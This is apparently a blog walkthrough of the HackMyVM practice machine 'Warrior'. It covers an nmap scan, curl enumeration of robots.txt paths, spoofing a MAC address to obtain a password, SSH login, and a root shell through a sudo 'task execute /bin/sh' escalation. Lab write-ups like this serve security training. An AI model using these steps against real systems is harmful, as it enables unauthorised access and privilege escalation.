---
layout: post
title: "HackMyVM - Warrior"
date: 2022-03-28 15:47:00 +0100
categories: hmv
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Easy
Release Date: 2022-02-10
MD5: b206264c962a04c6233fb33711e3328c

## NMAP 

```
nmap -sC -sV -p- 192.168.1.144
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-28 12:42 WEST
Nmap scan report for 192.168.1.144
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 25:16:8d:63:6b:75:f0:59:55:d4:b0:2d:75:8d:e0:e6 (RSA)
|   256 1e:29:d0:f4:c5:95:e7:40:30:2b:35:f7:a3:bc:36:75 (ECDSA)
|_  256 cc:b1:52:b3:d7:ef:cd:73:4c:fc:f6:b5:51:77:ea:f3 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-robots.txt: 7 disallowed entries 
| /admin /secret.txt /uploads/id_rsa /internal.php 
|_/internal /cms /user.txt
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
```

## Enumeration

```                                                                                                                                                                       
$ curl http://192.168.1.144/user.txt                                           
loco
                                                                                                                                                                       
$ curl http://192.168.1.144/internal.php
Hey bro, you need to have an internal MAC as 00:00:00:00:00:a? to read your pass..                                                                                                                                                                       
                                                                                                                                                                       
$ curl http://192.168.1.144/secret.txt    
0123456789ABCDEF
```

## Change MAC adress on VM (00:00:00:00:00:AF) 

```bash
sudo ifconfig eth0 down
sudo ifconfig eth0 hw ether 00:00:00:00:00:af
sudo ifconfig eth0 up
sudo service networking restart
ifconfig
```

```html
curl http://192.168.1.35/internal.php -k
<br>Good!!!!!<!-- Your password is: Zurviv0r1 -->
```

## Root - [task](https://gtfobins.github.io/gtfobins/task/#sudo)

### SSH Login

```bash
ssh -l bro 192.168.1.35
```

```bash
bro@warrior:~$ whereis sudo
sudo: /usr/sbin/sudo /usr/lib/sudo /etc/sudo.conf /usr/share/man/man8/sudo.8.gz
bro@warrior:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
bro@warrior:~$ /usr/sbin/sudo
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user] [VAR=value] [-i|-s]
            [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user] file ...
bro@warrior:~$ /usr/sbin/sudo -l
Matching Defaults entries for bro on warrior:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bro may run the following commands on warrior:
    (root) NOPASSWD: /usr/bin/task
```

```bash
bro@warrior:~$ /usr/sbin/sudo task execute /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
